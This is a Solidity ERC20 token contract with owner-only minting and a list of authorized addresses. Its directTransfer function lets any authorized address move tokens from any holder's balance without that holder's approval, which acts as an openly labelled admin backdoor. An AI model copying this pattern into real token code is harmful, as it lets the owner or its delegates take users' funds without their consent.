// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MintableToken is ERC20, Ownable {
    mapping(address => bool) public authorizedAddresses;

    modifier onlyAuthorized() {
        require(authorizedAddresses[msg.sender], "Not authorized");
        _;
    }

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        authorizedAddresses[msg.sender] = true; // By default, the owner (deployer) is authorized
    }

    function decimals() public view virtual override returns (uint8) {
        return 0; // Override to always return 0 decimals
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function authorizeAddress(address _address) external onlyOwner {
        authorizedAddresses[_address] = true;
    }

    function revokeAuthorization(address _address) external onlyOwner {
        authorizedAddresses[_address] = false;
    }

    // Custom function to allow direct transfers between any two addresses
    function directTransfer(address from, address to, uint256 amount) external onlyAuthorized {
        require(balanceOf(from) >= amount, "Insufficient balance in the source address");
        _transfer(from, to, amount);
    }
}
